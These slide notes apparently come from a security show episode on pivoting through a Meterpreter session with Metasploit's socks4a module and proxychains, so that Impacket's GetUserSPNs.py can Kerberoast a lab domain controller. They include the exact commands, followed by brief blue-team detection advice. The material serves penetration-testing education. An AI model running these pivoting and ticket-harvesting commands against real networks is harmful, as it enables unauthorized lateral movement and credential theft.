Pivoting Tools Through Meterpreter - Tradecraft Security Weekly #16

# Sometimes you need more
- Metasploit is awesome and has a ton of modules and functionality
- Sometimes there is a need to run something on a target system in a pentest that Metasploit doesn't have a module for
- This is where the socks4a module comes in
- and Proxychains
# Kerberoasting
- Very effective attack on Kerberos implementation
- Core Impact Impacket project has a very reliable example script for this attack
- GetUserSPN.py
# Combining the two things
- But the windows system I have meterpreter session on has no python installed!
- No worries - we can proxy the Impacket scripts over the meterpreter session
- Combining socks4a module, proxychains and Impacket scripts
# What you will need
- Metasploit and a reverse_tcp meterpreter session
- Proxychains 
# DEMO
after obtaining a meterpreter session:
```
msf exploit(handler)> use auxiliary/server/socks4a
> options
> set SRVPORT 8080
> run
> route add 192.168.2.0 255.255.255.0 1
```
make sure that proxychains is listening on the same srvport that we set in msf
```
# less /etc/proxychains.conf
# proxychains GetUserSPNs.py -request -dc-ip 192.168.2.160 lab.user 
```
# For the blue team
- Possible to log Kerberos ticket requests (potentially noisy)
- Honey-SPN entries linked to monitored accounts
- https://www.blackhillsinfosec.com/a-toast-to-kerberoast/
